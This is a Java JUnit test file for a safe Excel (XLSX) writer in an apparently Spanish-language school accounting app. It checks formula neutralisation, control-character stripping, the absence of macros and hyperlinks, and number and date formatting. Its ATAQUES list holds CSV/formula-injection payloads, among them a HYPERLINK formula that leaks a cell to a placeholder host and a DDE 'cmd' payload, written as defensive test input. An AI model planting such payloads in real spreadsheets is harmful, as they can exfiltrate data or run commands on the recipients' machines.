package pe.edu.virgenmaria.cuentasclaras.comun.excel;

import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/** P10: el Excel del contador no admite fórmulas, aunque el texto venga de una persona. */
class EscritorXlsxSeguroTest {

	private final EscritorXlsxSeguro escritor = new EscritorXlsxSeguro();

	private static final List<String> ATAQUES = List.of("=HYPERLINK(\"http://x/?\"&A1;\"ver\")", "+cmd|' /C calc'!A0",
			"@SUM(1+1)", "-2+3", "\t=1+1", "\r=1+1", "|calc", "%0A=1", "＝1+1", "＋1", "  =1+1", "\u0000=1+1");

	private byte[] libro(List<String> textos) {
		return escritor.escribir(List.of(new HojaReporte("Datos", List.of("Texto"),
				textos.stream().map(t -> List.of(Celda.texto(t))).toList())));
	}

	@ParameterizedTest
	@ValueSource(ints = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 })
	void textoQueEmpiezaConIgualNoEsFormula(int caso) throws IOException {
		String ataque = ATAQUES.get(caso);
		try (XSSFWorkbook leido = new XSSFWorkbook(new ByteArrayInputStream(libro(List.of(ataque))))) {
			Cell celda = leido.getSheet("Datos").getRow(1).getCell(0);
			assertThat(celda.getCellType()).isEqualTo(CellType.STRING);
			assertThat(celda.getCellStyle().getQuotePrefixed()).as("prefijo de comilla").isTrue();
			assertThat(celda.getStringCellValue()).as("apóstrofo delante (sobrevive al pasar a CSV)").startsWith("'");
			assertThat(celda.getStringCellValue().chars().anyMatch(c -> c < 0x20)).as("sin caracteres de control")
					.isFalse();
		}
	}

	@Test
	void ningunaHojaTieneEtiquetaF() throws IOException {
		byte[] archivo = libro(ATAQUES);
		try (ZipInputStream zip = new ZipInputStream(new ByteArrayInputStream(archivo))) {
			ZipEntry entrada;
			int hojas = 0;
			while ((entrada = zip.getNextEntry()) != null) {
				String nombre = entrada.getName();
				assertThat(nombre).as("sin macros, comentarios ni hipervínculos").doesNotContain("vbaProject", "comments",
						"externalLink");
				if (nombre.startsWith("xl/worksheets/sheet")) {
					hojas++;
					String xml = new String(zip.readAllBytes(), StandardCharsets.UTF_8);
					assertThat(xml).doesNotContain("<f>", "<f ", "<hyperlink");
				}
			}
			assertThat(hojas).isEqualTo(1);
		}
	}

	@Test
	void textoNormalSinComillaYSinControlesRecortadoA500() throws IOException {
		String largo = "Pensión marzo 2027 " + "x".repeat(600);
		try (XSSFWorkbook leido = new XSSFWorkbook(new ByteArrayInputStream(libro(List.of("Pensión  marzo\n 2027",
				largo))))) {
			Cell normal = leido.getSheet("Datos").getRow(1).getCell(0);
			assertThat(normal.getStringCellValue()).isEqualTo("Pensión marzo 2027");
			assertThat(normal.getCellStyle().getQuotePrefixed()).isFalse();
			assertThat(leido.getSheet("Datos").getRow(2).getCell(0).getStringCellValue()).hasSize(500);
		}
	}

	@Test
	void montosComoNumeroConDosDecimalesYFechas() throws IOException {
		byte[] archivo = escritor.escribir(List.of(new HojaReporte("Montos", List.of("Monto", "Fecha", "Código"), List.of(
				List.of(Celda.dinero(new BigDecimal("1250.10")), Celda.fecha(LocalDate.of(2027, 4, 15)), Celda.entero(42)),
				List.of(Celda.dinero(new BigDecimal("999999999.99")), Celda.fecha(null), Celda.entero(7))))));
		try (XSSFWorkbook leido = new XSSFWorkbook(new ByteArrayInputStream(archivo))) {
			Sheet hoja = leido.getSheet("Montos");
			Row fila = hoja.getRow(1);
			assertThat(fila.getCell(0).getCellType()).isEqualTo(CellType.NUMERIC);
			assertThat(BigDecimal.valueOf(fila.getCell(0).getNumericCellValue())).isEqualByComparingTo("1250.10");
			assertThat(fila.getCell(0).getCellStyle().getDataFormatString()).isEqualTo("#,##0.00");
			assertThat(fila.getCell(1).getLocalDateTimeCellValue().toLocalDate()).isEqualTo(LocalDate.of(2027, 4, 15));
			assertThat(fila.getCell(2).getNumericCellValue()).isEqualTo(42);
			assertThat(BigDecimal.valueOf(hoja.getRow(2).getCell(0).getNumericCellValue()))
					.isEqualByComparingTo("999999999.99");
			assertThat(hoja.getRow(2).getCell(1).getStringCellValue()).isEmpty();
		}
	}

	@Test
	void montoConMasDeDosDecimalesOFueraDeRangoNoSeEscribe() {
		assertThatThrownBy(() -> escritor.escribir(List.of(new HojaReporte("Montos", List.of("Monto"),
				List.of(List.of(Celda.dinero(new BigDecimal("1.005"))))))))
				.isInstanceOf(IllegalArgumentException.class);
		assertThatThrownBy(() -> escritor.escribir(List.of(new HojaReporte("Montos", List.of("Monto"),
				List.of(List.of(Celda.dinero(new BigDecimal("1000000000.00"))))))))
				.isInstanceOf(IllegalArgumentException.class);
	}

	@Test
	void nombreDeHojaFijoYTopeDeFilas() {
		assertThatThrownBy(() -> new HojaReporte("=Hoja", List.of(), List.of())).isInstanceOf(IllegalArgumentException.class);
		List<List<Celda>> demasiadas = java.util.Collections.nCopies(EscritorXlsxSeguro.MAX_FILAS + 1,
				List.of(Celda.entero(1)));
		assertThatThrownBy(() -> escritor.escribir(List.of(new HojaReporte("Datos", List.of("N"), demasiadas))))
				.isInstanceOf(IllegalArgumentException.class);
	}
}
